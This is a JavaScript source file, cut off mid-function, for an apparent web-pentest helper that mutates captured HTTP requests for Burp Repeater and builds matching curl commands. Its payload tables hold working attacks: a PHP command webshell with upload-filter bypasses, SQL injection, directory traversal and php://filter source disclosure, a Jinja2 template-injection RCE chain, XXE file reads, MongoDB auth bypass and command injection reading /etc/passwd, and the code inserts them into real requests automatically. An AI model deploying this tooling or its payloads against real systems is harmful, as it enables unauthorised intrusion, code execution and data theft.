/*!
 * OBOL Burp Suite Repeater Co-Pilot (Tier B Guided Web Instrument)
 * Shared across Cockpit Right Canvas (#/path) and Workbench (#/workbench/burp).
 *
 * 3-State Evidence-Backed Loop:
 *   1. Capture: Accessible inline SVG highlights Proxy -> HTTP history -> Send to Repeater -> Copy Request.
 *   2. Mutate:  Renders the operator's actual pasted raw HTTP request inside Repeater with glowing
 *               parameter/filename highlights, clickable attack/bypass mutation pills, 1-click Copy
 *               for both Burp Repeater and equivalent CLI curl, and a glowing Send prompt.
 *   3. Verdict: Evaluates pasted HTTP response through OBOL's parser/outcome engine, settling on
 *               confirmed proof or rotating to the next untried bypass pill when blocked.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var U = OBOL.util || {};
  function esc(s) {
    return U.esc ? U.esc(s) : String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }
  function attr(s) {
    return U.attr ? U.attr(s) : esc(s).replace(/'/g, '&#39;');
  }

  var ELIGIBLE_MOVES = {
    'file-upload': 'upload',
    'sqli-basics': 'sqli',
    'manual-sqli-exploitation': 'sqli',
    'lfi-probe': 'lfi',
    'ssti': 'ssti',
    'ssti-to-rce': 'ssti',
    'xxe': 'xxe',
    'nosql-injection': 'nosqli',
    'command-injection': 'cmdi',
    'idor': 'sqli',
    'authz-abuse': 'nosqli',
    'deserialization': 'xxe',
    'ssrf': 'lfi',
    'web-access-blocked': 'sqli'
  };

  var ATTACK_FAMILIES = [
    {
      id: 'upload',
      label: 'Upload Bypass',
      mutations: [
        { id: 'phtml_jpeg', label: '.phtml + image/jpeg', ext: '.phtml', mime: 'image/jpeg', magic: '', body: "<?php system($_GET['cmd']); ?>", note: 'Bypasses strict .php blacklists on Apache/PHP while satisfying MIME Content-Type checks.' },
        { id: 'double_gif', label: '.php.jpg + GIF89a', ext: '.php.jpg', mime: 'image/gif', magic: 'GIF89a;\n', body: "<?php system($_GET['cmd']); ?>", note: 'Satisfies both getimagesize()/magic-byte checks (GIF89a;) and double-extension handlers.' },
        { id: 'gif_magic_php', label: 'GIF89a + .php', ext: '.php', mime: 'image/gif', magic: 'GIF89a;\n', body: "<?php system($_GET['cmd']); ?>", note: 'Defeats finfo_file() / magic-byte inspection when .php itself is still allowed.' },
        { id: 'phar_png', label: '.phar + image/png', ext: '.phar', mime: 'image/png', magic: '', body: "<?php system($_GET['cmd']); ?>", note: 'Alternative executable PHP extension often missed by .php/.phtml deny-lists.' }
      ]
    },
    {
      id: 'sqli',
      label: 'SQLi',
      mutations: [
        { id: 'sqli_quote', label: "Quote Probe (')", mode: 'append', payload: "'", note: 'Triggers a SQL syntax error or abrupt row disappearance when input is concatenated unparameterized.' },
        { id: 'sqli_bool', label: "' OR 1=1-- -", mode: 'replace', payload: "1' OR 1=1-- -", note: 'Boolean tautology for authentication bypass or row expansion.' },
        { id: 'sqli_union', label: 'UNION SELECT 1..5', mode: 'replace', payload: "0' UNION SELECT 1,2,3,4,5-- -", note: 'Probes reflected output columns so version(), user(), and table rows can be extracted.' },
        { id: 'sqli_sleep', label: 'Blind SLEEP(3)', mode: 'append', payload: "' AND SLEEP(3)-- -", note: 'Confirms blind SQL injection via a 3-second response delay in Repeater.' }
      ]
    },
    {
      id: 'lfi',
      label: 'LFI / Filter',
      mutations: [
        { id: 'lfi_passwd', label: '../../../../etc/passwd', mode: 'replace', payload: '../../../../../etc/passwd', note: 'Standard directory traversal read against Unix targets; look for root:x:0:0.' },
        { id: 'lfi_nested', label: '....// strip bypass', mode: 'replace', payload: '....//....//....//....//etc/passwd', note: 'Evades non-recursive str_replace("../", "") filters.' },
        { id: 'lfi_filter', label: 'php://filter base64', mode: 'replace', payload: 'php://filter/convert.base64-encode/resource=index.php', note: 'Discloses raw PHP source code in base64 without executing it so database credentials leak.' },
        { id: 'lfi_winini', label: 'Windows win.ini', mode: 'replace', payload: '..\\..\\..\\..\\windows\\win.ini', note: 'Confirms LFI on Windows/IIS targets; look for [fonts] or [extensions].' }
      ]
    },
    {
      id: 'ssti',
      label: 'SSTI',
      mutations: [
        { id: 'ssti_jinja_math', label: '{{7*7}} probe', mode: 'replace', payload: '{{7*7}}', note: 'Jinja2 / Twig math evaluation probe; 49 in the HTTP response confirms template execution.' },
        { id: 'ssti_el_math', label: '${7*7} probe', mode: 'replace', payload: '${7*7}', note: 'Freemarker / Java EL / Mako math probe; 49 confirms expression evaluation.' },
        { id: 'ssti_jinja_id', label: 'Jinja2 id RCE', mode: 'replace', payload: "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", note: 'Executes id on Jinja2 targets to prove OS command execution.' }
      ]
    },
    {
      id: 'xxe',
      label: 'XXE',
      mutations: [
        { id: 'xxe_passwd', label: 'ENTITY /etc/passwd', mode: 'xml', payload: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE obol [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<root><data>&xxe;</data></root>', note: 'Resolves local /etc/passwd via an external XML SYSTEM entity.' },
        { id: 'xxe_filter', label: 'ENTITY php://filter', mode: 'xml', payload: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE obol [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>\n<root><data>&xxe;</data></root>', note: 'Base64-encodes PHP source files cleanly inside XML output.' }
      ]
    },
    {
      id: 'nosqli',
      label: 'NoSQLi',
      mutations: [
        { id: 'nosql_ne', label: '$ne auth bypass', mode: 'nosql_ne', payload: '[$ne]=obol_none', note: 'Bypasses MongoDB login checks by matching the first user record where password != obol_none.' },
        { id: 'nosql_regex', label: '$regex ^a oracle', mode: 'nosql_regex', payload: '[$regex]=^a', note: 'Tests character-by-character password extraction via MongoDB $regex.' }
      ]
    },
    {
      id: 'cmdi',
      label: 'Command Inj',
      mutations: [
        { id: 'cmdi_semi', label: ';id', mode: 'append', payload: ';id', note: 'Appends id via shell command separator; look for uid= in response.' },
        { id: 'cmdi_sub', label: '$(id)', mode: 'append', payload: '$(id)', note: 'Executes id inside subshell substitution when ; and | are filtered.' },
        { id: 'cmdi_ifs', label: ';cat${IFS}/etc/passwd', mode: 'append', payload: ';cat${IFS}/etc/passwd', note: 'Bypasses whitespace filters on Linux using ${IFS}.' }
      ]
    }
  ];

  // Ephemeral UI state per target
  var _uiState = Object.create(null);

  function getState(targetIp, move) {
    var key = String(targetIp || 'default');
    if (!_uiState[key]) {
      _uiState[key] = {
        reqIdx: 0,
        family: (move && ELIGIBLE_MOVES[move.id]) || 'sqli',
        mutIdx: 0,
        paramName: '',
        forceCapture: false,
        triedByFamily: Object.create(null),
        verdict: null,
        moveBound: move ? move.id : ''
      };
    }
    var st = _uiState[key];
    if (move && move.id && ELIGIBLE_MOVES[move.id] && st.moveBound !== move.id) {
      st.moveBound = move.id;
      st.family = ELIGIBLE_MOVES[move.id];
      st.mutIdx = 0;
      st.verdict = null;
    }
    return st;
  }

  function isEligibleMove(move) {
    return !!(move && move.id && ELIGIBLE_MOVES[move.id]);
  }

  function _factsForTarget(facts, kind, targetIp) {
    if (!facts) return [];
    var out = [];
    var scope = targetIp ? ('host:' + targetIp) : '';
    if (Array.isArray(facts.facts)) {
      for (var i = 0; i < facts.facts.length; i++) {
        var f = facts.facts[i];
        if (!f || f.state !== 'supported' || f.kind !== kind) continue;
        if (scope && f.scope && f.scope !== scope && f.scope !== 'host:target') continue;
        if (f.value && typeof f.value === 'object') out.push(f.value);
      }
      return out;
    }
    if (typeof facts.values === 'function') return facts.values(kind) || [];
    return out;
  }

  function savedRequestsForTarget(eng, facts, targetIp) {
    var ip = String(targetIp || (eng && eng.params && eng.params.target) || 'default').trim();
    var list = (eng && eng.webRequests && Array.isArray(eng.webRequests[ip])) ? eng.webRequests[ip].slice() : [];
    var fromFacts = _factsForTarget(facts, 'web.http_request_captured', ip);
    for (var i = fromFacts.length - 1; i >= 0; i--) {
      var fv = fromFacts[i];
      if (!fv || !fv.raw) continue;
      var k = String(fv.method || 'GET').toUpperCase() + ' ' + String(fv.path || '/');
      var dup = list.some(function (x) {
        return (String(x.method || 'GET').toUpperCase() + ' ' + String(x.path || '/')) === k;
      });
      if (!dup) list.push(fv);
    }
    return list;
  }

  function shouldAutoOpen(move, facts, eng, targetIp) {
    if (!isEligibleMove(move)) return false;
    var ui = (eng && eng.ui) || {};
    var modeMap = ui.burpModeByAction || {};
    if (modeMap[move.id] === 'burp') return true;
    if (modeMap[move.id] === 'cli') return false;

    var reqs = savedRequestsForTarget(eng, facts, targetIp);
    if (reqs.length > 0) return true;

    if (move.id === 'idor' || move.id === 'web-access-blocked') return true;
    if (facts && typeof facts.has === 'function' && (facts.has('blocker.rate_limited') || facts.has('blocker.hardcoded_proxy'))) {
      return true;
    }
    if (move.id === 'file-upload') {
      var formsFacts = _factsForTarget(facts, 'web.forms_discovered', targetIp);
      var hasUploadForm = formsFacts.some(function (fv) {
        return Array.isArray(fv.forms) && fv.forms.some(function (fm) { return fm.hasFile || fm.isMultipart; });
      });
      if (!hasUploadForm) return true;
    }
    return false;
  }

  function getFamily(id) {
    for (var i = 0; i < ATTACK_FAMILIES.length; i++) {
      if (ATTACK_FAMILIES[i].id === id) return ATTACK_FAMILIES[i];
    }
    return ATTACK_FAMILIES[1];
  }

  function _bashQuote(s) {
    return "'" + String(s == null ? '' : s).replace(/'/g, "'\\''") + "'";
  }

  function mutateRequest(req, fam, mut, chosenParam) {
    var MARK_S = '\x01OBOL_GLOW_START\x01';
    var MARK_E = '\x01OBOL_GLOW_END\x01';
    var raw = String((req && req.raw) || '').replace(/^(?:[ \t]*\r?\n)+/, '');
    var splitM = /\r?\n\r?\n/.exec(raw);
    var headStr = splitM ? raw.slice(0, splitM.index) : raw;
    var bodyStr = splitM ? raw.slice(splitM.index + splitM[0].length) : '';
    var lines = headStr.split(/\r?\n/);
    var reqLine = lines[0] || 'GET / HTTP/1.1';
    var rlM = /^(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+(\S+)\s+(HTTP\/[12](?:\.\d)?)$/i.exec(reqLine.trim());
    var method = rlM ? rlM[1].toUpperCase() : (req.method || 'GET');
    var path = rlM ? rlM[2] : (req.path || '/');
    var httpVer = rlM ? rlM[3] : 'HTTP/1.1';
    var headers = [];
    for (var i = 1; i < lines.length; i++) {
      var col = lines[i].indexOf(':');
      if (col > 0) headers.push({ name: lines[i].slice(0, col).trim(), value: lines[i].slice(col + 1).trim() });
    }

    var params = Array.isArray(req.params) ? req.params : [];
    var targetParam = chosenParam || '';
    if (!targetParam && params.length) {
      if (fam.id === 'upload') {
        var fp = params.filter(function (p) { return p.loc === 'multipart' && p.filename; })[0];
        targetParam = (fp && fp.name) || params[0].name;
      } else {
        targetParam = params[0].name;
      }
    }

    var dispPath = path;
    var dispBody = bodyStr;
    var cleanPath = path;
    var cleanBody = bodyStr;
    var setContentType = '';

    if (fam.id === 'upload') {
      var bnd = req.boundary || '----OBOLBoundary7MA4YWxkTrZu0gW';
      if (req.boundary && bodyStr.indexOf('--' + req.boundary) >= 0) {
        var fnReplaced = false;
        cleanBody = bodyStr.replace(/(\bfilename=")([^"]*)(")/i, function (_m, p1, oldFn, p3) {
          fnReplaced = true;
          var base = (oldFn || 'shell').replace(/\.[A-Za-z0-9.]+$/, '') || 'shell';
          return p1 + base + mut.ext + p3;
        });
        dispBody = bodyStr.replace(/(\bfilename=")([^"]*)(")/i, function (_m, p1, oldFn, p3) {
          var base = (oldFn || 'shell').replace(/\.[A-Za-z0-9.]+$/, '') || 'shell';
          return p1 + MARK_S + base + mut.ext + MARK_E + p3;
        });
        cleanBody = cleanBody.replace(/(Content-Type:\s*)([^\r\n]+)(\r?\n\r?\n)([\s\S]*?)(\r?\n--)/i, function (_m, c1, _oldCt, sep, _oldContent, tail) {
          return c1 + mut.mime + sep + mut.magic + mut.body + tail;
        });
        dispBody = dispBody.replace(/(Content-Type:\s*)([^\r\n]+)(\r?\n\r?\n)([\s\S]*?)(\r?\n--)/i, function (_m, c1, _oldCt, sep, _oldContent, tail) {
          return c1 + MARK_S + mut.mime + MARK_E + sep + MARK_S + mut.magic + mut.body + MARK_E + tail;
        });
        if (!fnReplaced) {
          cleanBody = '--' + bnd + '\r\nContent-Disposition: form-data; name="' + (targetParam || 'file') + '"; filename="shell' + mut.ext + '"\r\nContent-Type: ' + mut.mime + '\r\n\r\n' + mut.magic + mut.body + '\r\n--' + bnd + '--\r\n';
          dispBody = '--' + bnd + '\r\nContent-Disposition: form-data; name="' + (targetParam || 'file') + '"; filename="' + MARK_S + 'shell' + mut.ext + MARK_E + '"\r\nContent-Type: ' + MARK_S + mut.mime + MARK_E + '\r\n\r\n' + MARK_S + mut.magic + mut.body + MARK_E + '\r\n--' + bnd + '--\r\n';
        }
      } else {
        method = 'POST';
        setContentType = 'multipart/form-data; boundary=' + bnd;
        cleanBody = '--' + bnd + '\r\nContent-Disposition: form-data; name="' + (targetParam || 'file') + '"; filename="shell' + mut.ext + '"\r\nContent-Type: ' + mut.mime + '\r\n\r\n' + mut.magic + mut.body + '\r\n--' + bnd + '--\r\n';
        dispBody = '--' + bnd + '\r\nContent-Disposition: form-data; name="' + (targetParam || 'file') + '"; filename="' + MARK_S + 'shell' + mut.ext + MARK_E + '"\r\nContent-Type: ' + MARK_S + mut.mime + MARK_E + '\r\n\r\n' + MARK_S + mut.magic + mut.body + MARK_E + '\r\n--' + bnd + '--\r\n';
      }
    } else if (mut.mode === 'xml') {
      if (method === 'GET') method = 'POST';
      setContentType = 'application/xml';
      cleanBody = mut.payload;
      dispBody = MARK_S + mut.payload + MARK_E;
    } else if (mut.mode === 'nosql_ne' || mut.mode === 'nosql_regex') {
      if (method === 'GET') method = 'POST';
      var isJsonReq = /application\/json/i.test(req.contentType || '') || /^\s*\{/.test(bodyStr);
      var uKey = (params[0] && params[0].name) || 'username';
      var pKey = (params[1] && params[1].name) || 'password';
      if (isJsonReq) {
        setContentType = 'application/json';
        var jObj = {};
        jObj[uKey] = mut.mode === 'nosql_ne' ? { '$ne': null } : 'admin';
        jObj[pKey] = mut.mode === 'nosql_ne' ? { '$ne': null } : { '$regex': '^a' };
        cleanBody = JSON.stringify(jObj);
        dispBody = MARK_S + cleanBody + MARK_E;
      } else {
        setContentType = 'application/x-www-form-urlencoded';
        cleanBody = mut.mode === 'nosql_ne'
          ? (uKey + '[$ne]=obol_none&' + pKey + '[$ne]=obol_none')
          : ('username=admin&' + pKey + '[$regex]=^a');
        dispBody = MARK_S + cleanBody + MARK_E;
      }
    } else {
      var pObj = params.filter(function (p) { return p.name === targetParam; })[0] || params[0];
      var pLoc = (pObj && pObj.loc) || (method === 'GET' ? 'query' : 'body');
      var pName = (pObj && pObj.name) || 'id';
      var origVal = (pObj && pObj.value) || '1';
      var newVal = mut.mode === 'append' ? (origVal + mut.payload) : mut.payload;

      if (pLoc === 'json' && bodyStr) {
        try {
          var parsed = JSON.parse(bodyStr);
          parsed[pName] = newVal;
          cleanBody = JSON.stringify(parsed);
          dispBody = cleanBody.replace(JSON.stringify(newVal), MARK_S + JSON.stringify(newVal) + MARK_E);
        } catch (_e) {
          cleanBody = '{"' + pName + '":' + JSON.stringify(newVal) + '}';
          dispBody = '{"' + pName + '":' + MARK_S + JSON.stringify(newVal) + MARK_E + '}';
        }
      } else if (pLoc === 'body' && method !== 'GET') {
        var encVal = encodeURIComponent(newVal);
        var bParts = bodyStr ? bodyStr.split('&') : [];
        var hitBody = false;
        var cParts = [], dParts = [];
        bParts.forEach(function (pair) {
          var eq = pair.indexOf('=');
          var k = eq >= 0 ? pair.slice(0, eq) : pair;
          if (!hitBody && decodeURIComponent(k) === pName) {
            hitBody = true;
            cParts.push(k + '=' + encVal);
            dParts.push(k + '=' + MARK_S + encVal + MARK_E);
          } else {
            cParts.push(pair);
            dParts.push(pair);
          }
        });
        if (!hitBody) {
          cParts.push(encodeURIComponent(pName) + '=' + encVal);
          dParts.push(encodeURIComponent(pName) + '=' + MARK_S + encVal + MARK_E);
        }
        cleanBody = cParts.join('&');
        dispBody = dParts.join('&');
      } else {
        var qIdx = path.indexOf('?');
        var pBase = qIdx >= 0 ? path.slice(0, qIdx) : path;
        var qs = qIdx >= 0 ? path.slice(qIdx + 1) : '';
        var encQ = encodeURIComponent(newVal);
        var qParts = qs ? qs.split('&') : [];
        var hitQ = false;
        var cq = [], dq = [];
        qParts.forEach(function (pair) {
          if (!pair) return;
          var eq = pair.indexOf('=');
          var k = eq >= 0 ? pair.slice(0, eq) : pair;
          var decK = k;
          try { decK = decodeURIComponent(k); } catch (_e2) {}
          if (!hitQ && decK === pName) {
            hitQ = true;
            cq.push(k + '=' + encQ);
            dq.push(k + '=' + MARK_S + encQ + MARK_E);
          } else {
            cq.push(pair);
            dq.push(pair);
          }
        });
        if (!hitQ) {
          cq.push(encodeURIComponent(pName) + '=' + encQ);
          dq.push(encodeURIComponent(pName) + '=' + MARK_S + encQ + MARK_E);
        }
        cleanPath = pBase + '?' + cq.join('&');
        dispPath = pBase + '?' + dq.join('&');
      }
    }

    var outHeaders = [];
    var sawCt = false, sawCl = false;
    headers.forEach(function (h) {
      var low = h.name.toLowerCase();
      if (low === 'content-type' && setContentType) {
        sawCt = true;
        outHeaders.push({ name: 'Content-Type', value: setContentType });
      } else if (low === 'content-length') {
        sawCl = true;
        if (cleanBody) outHeaders.push({ name: 'Content-Length', value: String(cleanBody.length) });
      } else {
        outHeaders.push(h);
      }
    });
    if (setContentType && !sawCt) outHeaders.push({ name: 'Content-Type', value: setContentType });
    if (cleanBody && !sawCl && method !== 'GET' && method !== 'HEAD') {
      outHeaders.push({ name: 'Content-Length', value: String(cleanBody.length) });
    }

    var hdrBlock = outHeaders.map(function (h) { return h.name + ': ' + h.value; }).join('\r\n');
    var cleanRaw = method + ' ' + cleanPath + ' ' + httpVer + '\r\n' + hdrBlock + '\r\n\r\n' + cleanBody;
    var dispRaw = method + ' ' + dispPath + ' ' + httpVer + '\n' + outHeaders.map(function (h) { return h.name + ': ' + h.value; }).join('\n') + (dispBody ? ('\n\n' + dispBody) : '');

    var highlightedHtml = esc(dispRaw)
      .split(MARK_S).join('<mark class="burp-glow-tok">')
      .split(MARK_E).join('</mark>');

    var origin = req.origin || ((req.scheme || 'http') + '://' + (req.host || '127.0.0.1'));
    var curlParts = ['curl -skL -i'];
    if (method !== 'GET') curlParts.push('-X ' + method);
    outHeaders.forEach(function (h) {
      var low = h.name.toLowerCase();
      if (low === 'host' || low === 'content-length' || low === 'connection' || low === 'accept-encoding') return;
      if (fam.id === 'upload' && low === 'content-type') return;
      curlParts.push('-H ' + _bashQuote(h.name + ': ' + h.value));
    });
    if (fam.id === 'upload') {
      var shellFn = 'shell' + mut.ext;
      var payloadStr = (mut.magic ? 'GIF89a; ' : '') + mut.body;
      var prep = 'printf %s ' + _bashQuote(payloadStr) + ' > /tmp/' + shellFn + ' && ';
      curlParts.push('-F ' + _bashQuote((targetParam || 'file') + '=@/tmp/' + shellFn + ';type=' + mut.mime));
      curlParts.push(_bashQuote(origin + cleanPath));
      return { raw: cleanRaw, html: highlightedHtml, curl: prep + curlParts.join(' '), targetParam: targetParam };
    }
    if (cleanBody && method !== 'GET') {
      curlParts.push('--data-raw ' + _bashQuote(cleanBody));
    }
    curlParts.push(_bashQuote(origin + cleanPath));
    return { raw: cleanRaw, html: highlightedHtml, curl: curlParts.join(' '), targetParam: targetParam };
  }

  function renderSvgInstrument(stepState, req, fam, mut) {
    var isCapture = stepState === 'capture';
    var isVerdict = stepState === 'verdict';
    var titleText = isCapture
      ? 'Burp Suite guide - Step 1 Capture: Click Proxy tab, select HTTP history row, right-click Send to Repeater (Ctrl+R), and Copy Request.'
      : (isVerdict
        ? 'Burp Suite Repeater guide - Step 3 Verdict: Inspect HTTP response pane and verify proof.'
        : ('Burp Suite Repeater guide - Step 2 Mutate: Repeater tab active, ' + fam.label + ' (' + mut.label + ') highlighted in Request pane, and Send button glowing.'));

    var hostLbl = esc((req && req.host) || 'target-app');
    var pathLbl = esc(((req && req.method) ? (req.method + ' ' + (req.path || '/')) : 'POST /login HTTP/1.1').slice(0, 34));

    return '<div class="burp-svg-wrap">'
      + '<svg class="burp-svg" role="img" viewBox="0 0 680 198" xmlns="http://www.w3.org/2000/svg">'
      + '<title>' + esc(titleText) + '</title>'
      + '<rect x="2" y="2" width="676" height="194" rx="10" class="burp-svg-frame"/>'
      // Top Burp Suite Chrome Bar
      + '<rect x="2" y="2" width="676" height="32" rx="10" class="burp-svg-topbar"/>'
      + '<circle cx="18" cy="18" r="4.5" class="burp-svg-dot-a"/>'
      + '<circle cx="32" cy="18" r="4.5" class="burp-svg-dot-b"/>'
      + '<circle cx="46" cy="18" r="4.5" class="burp-svg-dot-c"/>'
      + '<text x="64" y="22" class="burp-svg-brand">BURP SUITE REPEATER CO-PILOT</text>'
      // Burp Module Tabs
      + '<g transform="translate(12, 40)">'
      + '<rect x="0" y="0" width="64" height="22" rx="4" class="burp-svg-tab"/>'
      + '<text x="32" y="15" text-anchor="middle" class="burp-svg-tab-txt">Target</text>'
      + '<rect x="70" y="0" width="68" height="22" rx="4" class="burp-svg-tab' + (isCapture ? ' is-active burp-svg-glow' : '') + '"/>'
      + '<text x="104" y="15" text-anchor="middle" class="burp-svg-tab-txt' + (isCapture ? ' is-active' : '') + '">Proxy</text>'
      + '<rect x="144" y="0" width="84" height="22" rx="4" class="burp-svg-tab' + (!isCapture ? ' is-active' : '') + '"/>'
      + '<text x="186" y="15" text-anchor="middle" class="burp-svg-tab-txt' + (!isCapture ? ' is-active' : '') + '">Repeater</text>'
      + '<rect x="234" y="0" width="74" height="22" rx="4" class="burp-svg-tab"/>'
      + '<text x="271" y="15" text-anchor="middle" class="burp-svg-tab-txt">Decoder</text>'
      + '</g>'
      + (isCapture
        ? (
          // State 1: Proxy -> HTTP history -> Send to Repeater -> Copy Request
          '<g transform="translate(14, 70)">'
          + '<rect x="0" y="0" width="110" height="20" rx="4" class="burp-svg-subtab"/>'
          + '<text x="55" y="14" text-anchor="middle" class="burp-svg-tab-txt">Intercept (Off)</text>'
          + '<rect x="116" y="0" width="116" height="20" rx="4" class="burp-svg-subtab is-active burp-svg-glow"/>'
          + '<text x="174" y="14" text-anchor="middle" class="burp-svg-tab-txt is-active">HTTP history</text>'
          + '<rect x="0" y="26" width="652" height="90" rx="6" class="burp-svg-pane"/>'
          + '<rect x="8" y="36" width="380" height="24" rx="4" class="burp-svg-row-hi burp-svg-glow"/>'
          + '<text x="18" y="52" class="burp-svg-mono">#1  http://' + hostLbl + '   POST /...   200</text>'
          + '<rect x="398" y="32" width="244" height="76" rx="6" class="burp-svg-menu burp-svg-glow"/>'
          + '<text x="412" y="52" class="burp-svg-menu-hi">1. Right-click -> Send to Repeater</text>'
          + '<text x="412" y="72" class="burp-svg-menu-hi">2. Right-click -> Copy (raw request)</text>'
          + '<text x="412" y="92" class="burp-svg-menu-sub">3. Paste below so OBOL mutates it</text>'
          + '</g>'
        )
        : (
          // State 2 & 3: Repeater Split Request / Response + Glowing Orange Send Button
          '<g transform="translate(14, 70)">'
          + '<rect x="0" y="0" width="82" height="24" rx="5" class="burp-svg-send' + (!isVerdict ? ' burp-svg-glow' : '') + '"/>'
          + '<text x="41" y="16" text-anchor="middle" class="burp-svg-send-txt">Send</text>'
          + '<rect x="92" y="0" width="280" height="24" rx="5" class="burp-svg-urlbar"/>'
          + '<text x="102" y="16" class="burp-svg-mono">' + hostLbl + '  |  ' + pathLbl + '</text>'
          + '<rect x="382" y="0" width="270" height="24" rx="5" class="burp-svg-pillbar"/>'
          + '<text x="394" y="16" class="burp-svg-pill-txt">Active Mutation: ' + esc(fam.label + ' - ' + mut.label) + '</text>'
          // Split Request / Response miniature panes
          + '<rect x="0" y="32" width="320" height="84" rx="6" class="burp-svg-pane' + (!isVerdict ? ' is-focus' : '') + '"/>'
          + '<text x="12" y="49" class="burp-svg-pane-h">Request (Paste mutated copy below)</text>'
          + '<text x="12" y="68" class="burp-svg-mono">' + pathLbl + '</text>'
          + '<rect x="12" y="76" width="256" height="18" rx="3" class="burp-svg-tok-box' + (!isVerdict ? ' burp-svg-glow' : '') + '"/>'
          + '<text x="18" y="89" class="burp-svg-tok-txt">' + esc(mut.label) + ' injected</text>'
          + '<rect x="332" y="32" width="320" height="84" rx="6" class="burp-svg-pane' + (isVerdict ? ' is-focus burp-svg-glow' : '') + '"/>'
          + '<text x="344" y="49" class="burp-svg-pane-h">Response (Copy back to OBOL)</text>'
          + '<text x="344" y="69" class="burp-svg-mono">HTTP/1.1 200 OK</text>'
          + '<text x="344" y="88" class="burp-svg-menu-sub">Paste response below to verify proof</text>'
          + '</g>'
        )
      )
      + '</svg>'
      + '</div>';
  }

  function renderPanel(opts) {
    opts = opts || {};
    var eng = (OBOL.store && OBOL.store.active && OBOL.store.active()) || {};
    var targetIp = String(opts.targetIp || (OBOL.store && OBOL.store.activeTarget && OBOL.store.activeTarget()) || (eng.params && eng.params.target) || '10.10.10.5').trim();
    var facts = opts.facts || ((OBOL.store && OBOL.store.factSetForTarget) ? OBOL.store.factSetForTarget(targetIp) : (OBOL.store && OBOL.store.factSet ? OBOL.store.factSet() : null));
    var move = opts.move || null;
    var st = getState(targetIp, move);
    var reqs = savedRequestsForTarget(eng, facts, targetIp);
    if (st.reqIdx >= reqs.length) st.reqIdx = 0;
    var activeReq = (!st.forceCapture && reqs.length) ? reqs[st.reqIdx] : null;
    var fam = getFamily(st.family);
    if (st.mutIdx >= fam.mutations.length) st.mutIdx = 0;
    var mut = fam.mutations[st.mutIdx] || fam.mutations[0];
    var stepState = !activeReq ? 'capture' : (st.verdict ? 'verdict' : 'mutate');

    var html = '<div class="burp-copilot" data-burp-root="1" data-burp-target="' + attr(targetIp) + '" data-burp-action="' + attr((move && move.id) || '') + '">';

    // Step indicator bar
    html += '<div class="burp-steps-bar" role="group" aria-label="Burp Co-Pilot workflow state">'
      + '<span class="burp-step-chip' + (stepState === 'capture' ? ' is-on' : (activeReq ? ' is-done' : '')) + '">1. Capture in Proxy</span>'
      + '<span class="burp-step-sep">-&gt;</span>'
      + '<span class="burp-step-chip' + (stepState === 'mutate' ? ' is-on' : (st.verdict ? ' is-done' : '')) + '">2. Mutate &amp; Send</span>'
      + '<span class="burp-step-sep">-&gt;</span>'
      + '<span class="burp-step-chip' + (stepState === 'verdict' ? ' is-on' : '') + '">3. Verify Response</span>'
      + (activeReq ? '<button type="button" class="btn-ghost burp-new-req-btn" data-burp-new-req="1">+ Capture New Request</button>' : '')
      + '</div>';

    html += renderSvgInstrument(stepState, activeReq, fam, mut);

    if (!activeReq) {
      html += '<div class="burp-capture-box">'
        + '<div class="burp-box-head">'
        + '<strong>Step 1: Paste Raw HTTP Request from Burp Proxy / Repeater</strong>'
        + '<div class="burp-sample-actions">'
        + (reqs.length ? '<button type="button" class="btn-ghost burp-mini-btn" data-burp-cancel-capture="1">Back to Saved (' + reqs.length + ')</button>' : '')
        + '<button type="button" class="btn-ghost burp-mini-btn" data-burp-sample="post">Load Login/Form Sample</button>'
        + '<button type="button" class="btn-ghost burp-mini-btn" data-burp-sample="upload">Load Multipart Upload Sample</button>'
        + '</div></div>'
        + '<p class="burp-help">Submit the form or upload once in your browser with Burp running, copy the raw HTTP request from <code>Proxy -&gt; HTTP history</code> or <code>Repeater</code>, and paste it here. OBOL preserves your session cookies, CSRF headers, and multipart boundaries.</p>'
        + '<textarea class="burp-textarea" data-burp-req-input="1" rows="7" spellcheck="false" placeholder="POST /upload.php HTTP/1.1&#10;Host: ' + attr(targetIp) + '&#10;Cookie: PHPSESSID=...&#10;Content-Type: multipart/form-data; boundary=----WebKitFormBoundary..."></textarea>'
        + '<div class="burp-action-row">'
        + '<button type="button" class="btn-primary" data-burp-parse-req="1">Load into Repeater Co-Pilot</button>'
        + '<span class="burp-status" data-burp-status="1" role="status"></span>'
        + '</div></div>';
      html += '</div>';
      return html;
    }

    // Saved request switcher pills
    if (reqs.length > 1) {
      html += '<div class="burp-saved-bar" role="group" aria-label="Captured requests for ' + attr(targetIp) + '">'
        + '<span class="burp-bar-k">Saved Requests:</span>'
        + reqs.map(function (r, idx) {
          var on = idx === st.reqIdx;
          return '<button type="button" class="burp-req-pill' + (on ? ' on' : '') + '" data-burp-req-idx="' + idx + '" aria-pressed="' + (on ? 'true' : 'false') + '">'
            + esc((r.method || 'GET') + ' ' + String(r.path || '/').slice(0, 28)) + '</button>';
        }).join('')
        + '</div>';
    }

    // Attack family tabs
    html += '<div class="burp-fam-bar" role="group" aria-label="Attack payload family">'
      + '<span class="burp-bar-k">Attack Class:</span>'
      + ATTACK_FAMILIES.map(function (f) {
        var on = f.id === fam.id;
        return '<button type="button" class="burp-fam-pill' + (on ? ' on' : '') + '" data-burp-fam="' + esc(f.id) + '" aria-pressed="' + (on ? 'true' : 'false') + '">' + esc(f.label) + '</button>';
      }).join('')
      + '</div>';

    // Target parameter picker when multiple parameters exist
    var reqParams = Array.isArray(activeReq.params) ? activeReq.params : [];
    if (reqParams.length > 1 && fam.id !== 'xxe' && fam.id !== 'nosqli') {
      var curParam = st.paramName || reqParams[0].name;
      html += '<div class="burp-param-bar" role="group" aria-label="Parameter to mutate">'
        + '<span class="burp-bar-k">Mutate Field:</span>'
        + reqParams.map(function (p) {
          var on = p.name === curParam;
          return '<button type="button" class="burp-param-pill' + (on ? ' on' : '') + '" data-burp-param="' + attr(p.name) + '" aria-pressed="' + (on ? 'true' : 'false') + '">'
            + '<code>' + esc(p.name) + '</code> <span class="burp-loc-tag">' + esc(p.loc) + '</span></button>';
        }).join('')
